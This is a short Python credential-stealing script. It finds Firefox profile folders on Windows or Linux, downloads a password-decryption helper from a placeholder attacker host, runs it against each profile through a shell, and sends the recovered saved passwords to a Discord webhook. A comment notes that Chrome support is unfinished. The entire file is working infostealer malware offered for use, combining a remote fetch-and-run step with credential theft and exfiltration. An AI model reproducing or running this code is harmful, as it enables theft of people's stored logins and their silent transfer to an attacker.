#!/usr/bin/python3
# coding: cp850
# TODO: implement functionality for chrome browser

import subprocess
import requests
import tempfile
import os
import sys
from discord import SyncWebhook

web_hook = 'your_webhook_:)'
username = None
chrome_path = None
firefox_path = None

def check_os():
    global username
    global firefox_path
    #global chrome_path

    if os.name == "nt":
        username = os.environ['USERPROFILE']
        firefox_path = f"{username}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\"
        #chrome_path =
    else:
        username = os.environ['USER']
        firefox_path = f"/home/{username}/.mozilla/firefox/"
        #chrome_path = 
    
def send_discord(data):
    webhook = SyncWebhook.from_url(web_hook)
    webhook.send(data)

def run_command(command):
    try:
        output_command = subprocess.check_output(command, shell=True)

        return output_command.decode("cp850").strip() if output_command else None
    except Exception as e:
        print(e)
        return None

def get_firefox_profiles():
    try:
        profiles = [profile for profile in os.listdir(firefox_path) if "release" in profile or "esr" in profile ]

        return profiles if profiles else None
    except Exception as e:
        print(e)
        return None

def get_firefox_passwords(profile):
    r = requests.get("http://ATTACKER_URL/firefox_decrypt.py")
    temp_dir = tempfile.mkdtemp()
    os.chdir(temp_dir)

    with open("firefox_decrypt.py","wb") as f:
        f.write(r.content)

    command = f"python firefox_decrypt.py {firefox_path}{profile} 2>null"

    passwords = run_command(command)

    os.remove("firefox_decrypt.py")

    return passwords

if __name__ == '__main__':
    check_os()
    profiles = get_firefox_profiles()

    if not username or not profiles:
        sys.exit(f"Couldn't obtain username or profiles for Firefox")

    for profile in profiles:
        passwords = get_firefox_passwords(profile)

        if passwords:
            send_discord(passwords)
        else:
            print("Passwords not found")
